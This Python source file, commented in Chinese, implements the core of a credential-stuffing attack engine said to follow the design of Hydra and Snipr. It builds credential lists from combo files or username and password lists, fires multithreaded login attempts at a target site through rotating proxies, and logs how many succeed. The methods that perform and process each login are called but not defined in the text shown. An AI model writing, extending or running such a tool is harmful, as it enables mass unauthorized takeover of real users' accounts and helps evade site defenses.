#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
攻击引擎核心模块
基于Hydra、Snipr等工具的设计理念实现
"""

import threading
import time
import requests
import random
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from models.database import db
from models.attack import Attack
from models.result import AttackResult
from models.target import Target
from models.proxy import Proxy
from core.proxy_manager import ProxyManager
import json
import logging

logger = logging.getLogger(__name__)

class AttackEngine:
    """撞库攻击引擎"""
    
    def __init__(self, attack_id):
        self.attack_id = attack_id
        self.attack = None
        self.target = None
        self.proxy_manager = ProxyManager()
        self.is_running = False
        self.is_paused = False
        self.start_time = None
        self.session = requests.Session()
        
        # 统计信息
        self.total_attempts = 0
        self.successful_attempts = 0
        self.failed_attempts = 0
        self.response_times = []
        
        self._load_attack_data()
    
    def _load_attack_data(self):
        """加载攻击任务数据"""
        try:
            self.attack = Attack.query.get(self.attack_id)
            if not self.attack:
                raise Exception(f"攻击任务 {self.attack_id} 不存在")
            
            self.target = Target.query.get(self.attack.target_id)
            if not self.target:
                raise Exception(f"目标站点 {self.attack.target_id} 不存在")
            
            logger.info(f"加载攻击任务: {self.attack.name} -> {self.target.name}")
            
        except Exception as e:
            logger.error(f"加载攻击数据失败: {e}")
            raise
    
    def _prepare_credentials(self):
        """准备凭据列表"""
        credentials = []
        
        if self.attack.wordlist_type == 'combo':
            # 组合字典格式: username:password
            combo_data = self.attack.combo_list or ""
            for line in combo_data.strip().split('\n'):
                if ':' in line:
                    username, password = line.strip().split(':', 1)
                    credentials.append((username, password))
        
        elif self.attack.wordlist_type == 'separate':
            # 分离字典
            usernames = (self.attack.username_list or "").strip().split('\n')
            passwords = (self.attack.password_list or "").strip().split('\n')
            
            # 笛卡尔积组合
            for username in usernames:
                for password in passwords:
                    if username and password:
                        credentials.append((username.strip(), password.strip()))
        
        logger.info(f"准备了 {len(credentials)} 个凭据组合")
        return credentials
    
    def start_attack(self, callback=None):
        """开始攻击"""
        if self.is_running:
            return False, "攻击已在运行中"
        
        try:
            self.is_running = True
            self.start_time = datetime.utcnow()
            
            # 更新攻击状态
            self.attack.status = 'running'
            self.attack.started_at = self.start_time
            db.session.commit()
            
            # 准备凭据
            credentials = self._prepare_credentials()
            if not credentials:
                return False, "没有可用的凭据"
            
            logger.info(f"开始攻击任务: {self.attack.name}")
            
            # 多线程执行攻击
            with ThreadPoolExecutor(max_workers=self.attack.max_threads) as executor:
                futures = []
                
                for username, password in credentials:
                    if not self.is_running:
                        break
                    
                    # 获取代理
                    proxy = None
                    if self.attack.use_proxy:
                        proxy = self.proxy_manager.get_proxy()
                    
                    # 提交任务
                    future = executor.submit(self._attempt_login, username, password, proxy)
                    futures.append(future)
                
                # 处理结果
                for future in as_completed(futures):
                    if not self.is_running:
                        break
                    
                    try:
                        result = future.result()
                        self._process_result(result)
                        
                        # 回调通知
                        if callback:
                            callback(result)
                        
                    except Exception as e:
                        logger.error(f"处理攻击结果失败: {e}")
            
            # 攻击完成
            self._finish_attack()
            return True, "攻击完成"
            
        except Exception as e:
            logger.error(f"攻击执行失败: {e}")
            self._finish_attack(error=str(e))
            return False, str(e)
    
    def stop_attack(self):
        """停止攻击"""
        self.is_running = False
        logger.info("攻击已停止")
    
    def _finish_attack(self, error=None):
        """完成攻击"""
        self.is_running = False
        self.attack.status = 'failed' if error else 'completed'
        self.attack.completed_at = datetime.utcnow()
        self.attack.error_message = error
        db.session.commit()
        
        logger.info(f"攻击完成: 成功 {self.successful_attempts}, 失败 {self.failed_attempts}")